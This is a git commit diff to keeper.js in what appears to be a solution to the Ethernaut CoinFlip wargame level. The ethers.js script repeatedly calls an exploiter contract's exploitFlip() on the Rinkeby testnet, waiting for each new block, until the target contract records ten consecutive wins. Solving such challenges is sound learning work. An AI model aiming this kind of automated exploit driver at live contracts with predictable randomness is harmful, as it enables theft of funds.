b2ae70d625a17a1a6ed00f76e3a096d774fe3722
lpd <laplace.daemon@pm.me>
2022-08-23 23:54:11 -0300

    add a more thorough keeper.js to beat the game

--- coin-flip/keeper.js
+++ coin-flip/keeper.js
@@ -1,34 +1,42 @@
 const ethers = require('ethers')
 
+const sleep = require('../utils/sleep')
+
 const target = '0xa63375092861FF43977506e7D0928f666c233Fb4'
 const exploiter = '0x8063a8D75143dEDDe37d53D8C8929e3Ec8DFc42e'
 
 const targetAbi = ['function consecutiveWins() view returns (uint256 wins)']
 const exploiterAbi = ['function exploitFlip() public']
 
+const provider = new ethers.providers.JsonRpcProvider(process.env.RINKEBY_RPC)
+const signer = new ethers.Wallet(process.env.DEPLOYER_PK, provider)
+
+const targetContract = new ethers.Contract(target, targetAbi, provider)
+const exploiterContract = new ethers.Contract(exploiter, exploiterAbi, signer)
+
+let blockNum
+
 const main = async () => {
-  const provider = await new ethers.providers.JsonRpcProvider(
-    process.env.RINKEBY_RPC,
-  )
+  newBlockNum = await provider.getBlockNumber()
 
-  const signer = new ethers.Wallet(process.env.DEPLOYER_PK, provider)
-
-  const targetContract = await new ethers.Contract(target, targetAbi, provider)
-  const exploiterContract = await new ethers.Contract(
-    exploiter,
-    exploiterAbi,
-    signer,
-  )
-
-  const wins = await targetContract.consecutiveWins()
-
-  console.log(`Current wins: ${wins}`)
-
-  if (wins >= 10) {
-    console.log('You won.')
+  if (newBlockNum === blockNum) {
+    console.log(`We already played on block ${blockNum}. Waiting 5000ms more.`)
+    await sleep(5000)
+    main()
   } else {
-    const tx = await exploiterContract.exploitFlip()
-    await tx.wait()
+    const wins = await targetContract.consecutiveWins()
+
+    if (wins >= 10) {
+      console.log('You won.')
+    } else {
+      console.log(`Current wins: ${wins}, playing again.`)
+
+      const tx = await exploiterContract.exploitFlip()
+      await tx.wait()
+
+      blockNum = await provider.getBlockNumber()
+      main()
+    }
   }
 }
 
